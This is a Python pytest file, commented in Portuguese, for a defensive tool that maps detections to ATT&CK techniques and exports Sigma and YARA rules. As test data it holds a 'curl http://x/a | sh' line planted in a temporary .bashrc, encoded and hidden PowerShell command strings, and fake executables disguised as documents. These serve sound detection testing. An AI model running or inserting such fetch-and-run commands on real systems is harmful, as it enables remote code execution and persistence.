"""Mapeamento ATT&CK e exportação Sigma/YARA."""
import re
from pathlib import Path

import pytest

from vigil import attack, core, export_rules

ROOT = Path(__file__).resolve().parent.parent
yaml = pytest.importorskip("yaml")


# ------------------------------------------------------------ catálogo e mapeamento
def test_todas_as_tecnicas_usadas_existem_no_catalogo():
    usadas = {t for r in core.SUSPECT_CMD for t in r.attack}
    usadas |= {attack.RUN_KEYS, attack.SCHEDULED_TASK, attack.CRON, attack.SYSTEMD, attack.SHELL_PROFILE,
               attack.RC_LOCAL, attack.XDG_AUTOSTART, attack.LD_PRELOAD}
    assert usadas <= set(attack.TECHNIQUES)


def test_formato_dos_ids():
    for tid in attack.TECHNIQUES:
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", tid), tid


def test_readme_documenta_todas_as_tecnicas():
    texto = (ROOT / "README.md").read_text(encoding="utf-8")
    assert [t for t in attack.TECHNIQUES if t not in texto] == []


def test_finding_junta_tecnicas_do_contexto_e_das_razoes_sem_repetir():
    f = core.finding("persistence", "x", [("a", 10, ("T1105", "T1059.004")), ("b", 5, ("T1105",))],
                     attack=("T1547.001",))
    assert [t["id"] for t in f["attack"]] == ["T1547.001", "T1105", "T1059.004"]
    assert f["score"] == 15
    assert f["attack"][0]["name"] == "Registry Run Keys / Startup Folder"


def test_finding_sem_tecnicas_tem_lista_vazia():
    assert core.finding("file", "x", [("a", 10)])["attack"] == []


def test_check_cmd_devolve_tecnicas():
    r = core.check_cmd("powershell -enc AAAA")
    assert r and set(r[0][2]) == {"T1059.001", "T1027.010"}


def test_analyze_file_mapeia_tecnicas(tmp_path):
    p = tmp_path / "fatura.pdf.exe"
    p.write_bytes(b"MZ" + b"\0" * 100)
    r = core.analyze_file(p, "windows", set(), None)
    ids = {t["id"] for t in r["attack"]}
    assert "T1036.007" in ids and "T1036.008" not in ids  # .exe não é extensão de documento


def test_analyze_file_pe_disfarçado_mapeia_masquerade(tmp_path):
    p = tmp_path / "a.pdf"
    p.write_bytes(b"MZ" + b"\0" * 100)
    assert "T1036.008" in {t["id"] for t in core.analyze_file(p, "linux", set(), None)["attack"]}


def test_persistencia_linux_mapeia_mecanismo_e_comando(tmp_path, monkeypatch):
    (tmp_path / ".bashrc").write_text(": curl http://x/a | sh\n")
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    f = next(x for x in core.linux_persistence() if ".bashrc" in x["where"])
    assert {t["id"] for t in f["attack"]} == {"T1546.004", "T1105", "T1059.004"}


# ------------------------------------------------------------ Sigma
@pytest.fixture(scope="module")
def sigma():
    return [(n, yaml.safe_load(t)) for n, t in export_rules.sigma_rules()]


def test_sigma_campos_obrigatorios(sigma):
    assert len(sigma) >= 10
    for name, d in sigma:
        for k in ("title", "id", "status", "logsource", "detection", "level", "tags"):
            assert k in d, (name, k)
        assert "condition" in d["detection"], name
        assert d["level"] in {"low", "medium", "high"}
        assert d["logsource"]["product"] in {"windows", "linux"}


def test_sigma_ids_e_nomes_unicos(sigma):
    ids = [d["id"] for _, d in sigma]
    assert len(set(ids)) == len(ids)
    assert len({n for n, _ in sigma}) == len(sigma)


def test_sigma_tags_attack_validas(sigma):
    for name, d in sigma:
        tecnicas = [t for t in d["tags"] if re.fullmatch(r"attack\.t\d{4}(\.\d{3})?", t)]
        assert tecnicas, name
        for t in tecnicas:
            assert t.split(".", 1)[1].replace("t", "T", 1).upper() in attack.TECHNIQUES, (name, t)


def test_sigma_regexes_compilam_e_casam_com_exemplos(sigma):
    por_titulo = {d["title"]: d for _, d in sigma}
    ps = por_titulo["Vigil - PowerShell codificado/oculto"]["detection"]["selection"]["CommandLine|re|i"]
    assert re.search(ps, "PowerShell.exe -ENC AAAA", re.I)
    assert not re.search(ps, "powershell.exe -File ok.ps1", re.I)
    for _, d in sigma:
        for sel in d["detection"].values():
            if isinstance(sel, dict):
                for k, v in sel.items():
                    if k.endswith("|re|i"):
                        for rx in ([v] if isinstance(v, str) else v):
                            re.compile(rx)


def test_sigma_nao_exporta_regra_sem_tecnica(sigma):
    assert not any("Caminho temporário" in d["title"] for _, d in sigma)


def test_sigma_ids_estaveis_entre_exportacoes():
    a = [yaml.safe_load(t)["id"] for _, t in export_rules.sigma_rules()]
    b = [yaml.safe_load(t)["id"] for _, t in export_rules.sigma_rules()]
    assert a == b


# ------------------------------------------------------------ YARA
@pytest.mark.skipif(core.yara is None, reason="yara-python não instalado")
def test_yara_exportada_compila_e_detecta(tmp_path):
    f = tmp_path / "vigil.yar"
    f.write_text(export_rules.yara_text(), encoding="utf-8")
    rules = core.yara.compile(filepath=str(f), externals=core.YARA_EXTERNALS)

    def nomes(data, filename):
        return {m.rule for m in rules.match(data=data, externals={"filename": filename, "filepath": filename})}

    assert "vigil_executavel_disfarcado_de_documento" in nomes(b"MZ" + b"\0" * 64, "fatura.pdf")
    assert "vigil_executavel_disfarcado_de_documento" not in nomes(b"MZ" + b"\0" * 64, "programa.exe")
    assert "vigil_dupla_extensao_suspeita" in nomes(b"x", "foto.png.exe")
    assert "vigil_dupla_extensao_suspeita" not in nomes(b"x", "foto.png")
    assert "vigil_cmd_powershell_codificado_oculto" in nomes(b"powershell -w hidden -enc AAAA", "a.ps1")
    assert not nomes(b"echo ola", "a.sh")


@pytest.mark.skipif(core.yara is None, reason="yara-python não instalado")
def test_yara_entropia_alta_so_em_binario(tmp_path):
    import os
    f = tmp_path / "vigil.yar"
    f.write_text(export_rules.yara_text(), encoding="utf-8")
    rules = core.yara.compile(filepath=str(f), externals=core.YARA_EXTERNALS)
    ext = {"filename": "x.bin", "filepath": "x.bin"}
    assert "vigil_binario_alta_entropia" in {m.rule for m in rules.match(data=b"MZ" + os.urandom(4096), externals=ext)}
    assert "vigil_binario_alta_entropia" not in {m.rule for m in rules.match(data=os.urandom(4096), externals=ext)}


# ------------------------------------------------------------ saída em disco
def test_write_all_cria_arquivos(tmp_path):
    files = export_rules.write_all(tmp_path)
    assert (tmp_path / "vigil.yar").exists()
    assert list((tmp_path / "sigma").glob("*.yml"))
    assert len(files) == len(export_rules.sigma_rules()) + 1


def test_write_all_so_sigma(tmp_path):
    export_rules.write_all(tmp_path, "sigma")
    assert not (tmp_path / "vigil.yar").exists()
